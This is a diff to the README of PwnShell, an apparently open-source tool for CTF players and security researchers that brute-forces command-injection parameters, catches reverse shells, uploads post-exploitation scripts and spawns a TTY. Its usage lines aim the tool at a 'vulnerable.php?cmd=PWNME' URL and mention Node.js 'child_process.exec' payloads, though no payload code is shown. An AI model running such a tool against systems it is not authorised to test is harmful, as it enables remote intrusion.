@@ -3,18 +3,28 @@
 # PwnShell
 
 ### PwnShell is a Powerfull RevShell Bruteforcer and Connection Handler built For Security Researchers and CTF Players!
+<details>
+    <ol>
+    <li><div>Bruteforces the Vulnerable Paramter</div></li>
+    <li><div>Recieve and Handle the Connection</div></li>
+    <li><div>Downloads Post exploitation scripts from their Repos.</div></li>
+    <li><div>Uploads them to target</div></li>
+    <li><div>Activates a TTY shell using Python3 </div></li>
+    <li><div>Enjoy!</div></li>
+  </ol>
+</details>
 
 ![Alt text](https://github.com/zAbuQasem/PwnShell/blob/main/Screenshots/PwnShell.png)
 
-<a href="#getting-started">
+## Navigation:
+   <ol>
     <li><a href="#installation">Installation</a></li>
     <li><a href="#usage">Usage</a></li>
     <li><a href="#contact">Contact</a></li>
     <li><a href="#acknowledgements">Acknowledgements</a></li>
   </ol>
-</details>
 
-## Installation
+## Installation:
 
 1. Clone the repo
    ```sh
@@ -31,7 +41,7 @@
    ```
 
 <!-- USAGE EXAMPLES -->
-## Usage
+## Usage:
 ### Request-File Method [Recommended] 👇
 ```sh
 ./pwnshell.py -H [HOST IP] -f [REQUEST FILE]
@@ -53,12 +63,12 @@ Upgrade-Insecure-Requests: 1
 ```
 ### URL Method 👇
 ```sh
-./pwnshell.py -H [HOST-IP] -u [TARGET-URL] -m [REQUEST-METHOD] -c [COOKIE (optional)] -k [HEADERS (optional)]
+./pwnshell.py -H [HOST-IP] -u [TARGET-URL] -m [REQUEST-METHOD] -c [COOKIES (optional)] -k [HEADERS (optional)]
 
 #Note: Cookie and headers must be in JSON format (if provided).
    ```
 ```sh
-./pwnshell.py -H <HOST-IP> -u http/s://<TARGET>/Vulnerable.php?cmd=PWNME --method GET --cookie '{"key" : "value"}' 
+./pwnshell.py -H <HOST-IP> -u http/s://<TARGET>/vulnerable.php?cmd=PWNME --method GET --cookies '{"key" : "value"}' 
 ```
 #### Example:
 -Replace the Vulnerable place in the parameter with 'PWNME'
@@ -67,13 +77,13 @@ Upgrade-Insecure-Requests: 1
 ./pwnshell.py -H 127.0.0.1 -u http://10.10.10.10/vulnerable.php?cmd=PWNME
 ```
 
-### For NodeJs Payloads 
+### For NodeJs Payloads:
 ```sh
 ./pwnshell.py -H [HOST-IP] -n   
   
 #To use only -> require('child_process').exec('Payload')
 ```
-## Preview
+## Preview:
 ### Using [Request-File Method]
 ![Alt text](https://github.com/zAbuQasem/PwnShell/blob/main/Screenshots/requestfile-demo.gif)
 
@@ -81,14 +91,14 @@ Upgrade-Insecure-Requests: 1
 ![Alt text](https://github.com/zAbuQasem/PwnShell/blob/main/Screenshots/url-demo.gif)
 
 <!-- CONTACT -->
-## Contact
+## Contact:
 
 **Zeyad AbuQasem** - [LinkedIn](https://www.linkedin.com/in/zeyad-abuqasem/)
 
 **Omar Albalouli** - [LinkedIn](https://www.linkedin.com/in/omar-albalouli/) & [Github](https://github.com/omaralbalolly)
 
 <!-- ACKNOWLEDGEMENTS -->
-## Acknowledgements
+## Acknowledgements:
 * [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 * [LinEnum](https://github.com/rebootuser/LinEnum)
 * [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
